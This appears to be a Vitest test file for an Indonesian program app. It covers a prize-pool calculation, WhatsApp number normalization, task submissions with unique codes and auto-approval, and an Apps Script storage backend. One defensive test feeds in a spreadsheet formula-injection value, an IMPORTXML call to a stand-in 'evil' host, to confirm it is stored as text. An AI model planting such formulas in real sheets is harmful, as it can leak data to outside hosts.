import { beforeEach, describe, expect, it } from 'vitest'
import { invalidate } from '@/lib/cache'
import { goldenAmount, formatRupiah } from '@/lib/golden'
import {
  normalizeWhatsapp, programSummary, reviewTaskSubmissions, saveTask, submitTask,
} from '@/lib/program-service'
import { setStore } from '@/lib/repo'
import { AppsScriptStore } from '@/lib/repo/apps-script-store'
import { LocalStore } from '@/lib/repo/memory-store'
import { taskSubmissionsTable } from '@/lib/repo/programs'
import { getSettingsFresh, saveSettings } from '@/lib/repo/settings'
import type { TableStore } from '@/lib/repo/store'
import { createAppsScriptSim } from './apps-script-sim'

const SECRET = 'x'.repeat(40)

describe('golden pool', () => {
  const pool = { golden_pool_start: 2_000_000, golden_pool_end: 5_000_000, golden_start_at: '2026-11-07T00:00:00+07:00', golden_end_at: '2026-12-05T23:59:59+07:00' }
  it('starts at 2jt, ends at 5jt on 5 Dec, grows monotonically in between', () => {
    expect(goldenAmount(pool, Date.parse('2026-11-01T00:00:00Z'))).toBe(2_000_000)
    expect(goldenAmount(pool, Date.parse('2026-12-06T00:00:00+07:00'))).toBe(5_000_000)
    const a = goldenAmount(pool, Date.parse('2026-11-20T12:00:00Z'))
    const b = goldenAmount(pool, Date.parse('2026-11-20T12:00:05Z'))
    expect(a).toBeGreaterThan(2_000_000)
    expect(a).toBeLessThan(5_000_000)
    expect(b).toBeGreaterThan(a)
    expect(b - a).toBeLessThan(20) // "sedikit demi sedikit": a few rupiah every second
  })
  it('formats rupiah', () => expect(formatRupiah(2345678)).toBe('Rp2.345.678'))
})

describe('identity helpers', () => {
  it('normalizes Indonesian WhatsApp numbers', () => {
    for (const v of ['081234567890', '+62 812-3456-7890', '6281234567890', '81234567890']) expect(normalizeWhatsapp(v)).toBe('6281234567890')
    for (const v of ['12345', '021555123', 'abc', '']) expect(normalizeWhatsapp(v)).toBeNull()
  })
})

describe.each([
  ['memory', () => new LocalStore(null) as TableStore],
  ['Apps Script (real Code.js, simulated sheet)', () => new AppsScriptStore('https://sim', SECRET, createAppsScriptSim(SECRET).poster) as TableStore],
])('program flow on %s', (_n, make) => {
  beforeEach(() => {
    setStore(make())
    invalidate()
  })

  async function setup() {
    const t1 = await saveTask('pelatihan', { title: 'Buat video 30 detik', description: '', proof_hint: 'link TikTok', active: true, order: 1 }, 'owner@x.id')
    const t2 = await saveTask('pelatihan', { title: 'Upload ke Sharein', description: '', proof_hint: '', active: true, order: 2 }, 'owner@x.id')
    return { t1, t2 }
  }
  const sub = (task_id: string, wa = '081234567890', name = 'Rina Utami') => ({ task_id, name, whatsapp: wa, proof_url: 'https://www.tiktok.com/@rina/video/1', note: '' })

  it('one finished task = one unique code; same task twice by same identity is refused', async () => {
    const { t1, t2 } = await setup()
    const a = await submitTask('pelatihan', sub(t1.id))
    const b = await submitTask('pelatihan', sub(t2.id, '+62 812 3456 7890'))
    expect(a.ok && a.code).toMatch(/^PC-[A-Z2-9]{6}$/)
    expect(b.ok && b.code).toMatch(/^PC-/)
    expect(a.ok && b.ok && a.code !== b.code).toBe(true)
    const again = await submitTask('pelatihan', sub(t1.id, '6281234567890'))
    expect(again.ok).toBe(false)
    expect(!again.ok && again.message).toContain(a.ok ? a.code : '')
  })

  it('validates identity, proof link, task, and closed program', async () => {
    const { t1 } = await setup()
    expect(await submitTask('pelatihan', { ...sub(t1.id), whatsapp: '123' })).toMatchObject({ ok: false, field: 'whatsapp' })
    expect(await submitTask('pelatihan', { ...sub(t1.id), proof_url: 'http://x.com' })).toMatchObject({ ok: false, field: 'proof_url' })
    expect(await submitTask('duta', sub(t1.id))).toMatchObject({ ok: false, field: 'task_id' })
    const s = await getSettingsFresh()
    await saveSettings({ ...s, pelatihan_open: false })
    expect((await submitTask('pelatihan', sub(t1.id))).ok).toBe(false)
  })

  it('auto-approve per program: new submissions are approved by the system, others still wait', async () => {
    const { t1, t2 } = await setup()
    const first = await submitTask('pelatihan', sub(t1.id, '081111111111', 'Andi'))
    expect(first).toMatchObject({ ok: true, status: 'pending' })
    const s = await getSettingsFresh()
    await saveSettings({ ...s, auto_approve_pelatihan: true })
    invalidate()
    const second = await submitTask('pelatihan', sub(t2.id, '081111111111', 'Andi'))
    expect(second).toMatchObject({ ok: true, status: 'approved' })
    const rows = await taskSubmissionsTable.list()
    expect(rows.map((r) => [r.status, r.reviewed_by])).toEqual([['pending', ''], ['approved', 'otomatis']])
    expect(rows[1].reviewed_at).not.toBe('')
    // Duta has its own switch, still off.
    const duta = await saveTask('duta', { title: 'Tugas wajib', description: '', proof_hint: '', active: true, order: 1 }, 'o')
    expect(await submitTask('duta', sub(duta.id, '081111111111', 'Andi'))).toMatchObject({ ok: true, status: 'pending' })
    await reviewTaskSubmissions('pelatihan', [rows[0].id], 'approve', '', 'o')
    invalidate()
    expect(await programSummary('pelatihan')).toMatchObject({ codes: 2, approved: 2, participants: 1 })
  })
})

describe('Apps Script Code.js guards', () => {
  it('rejects wrong secret and stores formula-looking input as text', async () => {
    const sim = createAppsScriptSim(SECRET)
    const bad = new AppsScriptStore('https://sim', 'y'.repeat(40), sim.poster)
    await expect(bad.read('settings')).rejects.toThrow(/unauthorized/)
    const good = new AppsScriptStore('https://sim', SECRET, sim.poster)
    await good.append('audit_log', [['2026', '=IMPORTXML("http://evil")', 'x', 'y', '', '']])
    const { rows } = await good.read('audit_log')
    expect(rows[0][1]).toBe('=IMPORTXML("http://evil")')
    expect(sim.sheets.get('audit_log')!.grid[0]).toEqual(['time', 'actor', 'action', 'target', 'before', 'after'])
  })
})
